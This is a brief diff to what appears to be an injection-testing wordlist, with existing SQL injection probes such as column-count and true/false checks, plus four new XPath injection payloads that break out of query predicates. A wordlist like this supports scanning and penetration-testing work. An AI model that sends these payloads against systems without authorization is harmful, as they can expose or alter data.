@@ -6,3 +6,7 @@ a' order by 9999-- #
 a' order by 1-- #
 a'and/*g*/456=678-- #
 a'or/*g*/345=345-- #
+345'%5d|//*|/a%5b'a
+456'%5d|//a|/a%5b'a
+345')%5d|//*|/a%5bcontains(a,'b
+456')%5d|//a|/a%5bcontains(a,'b
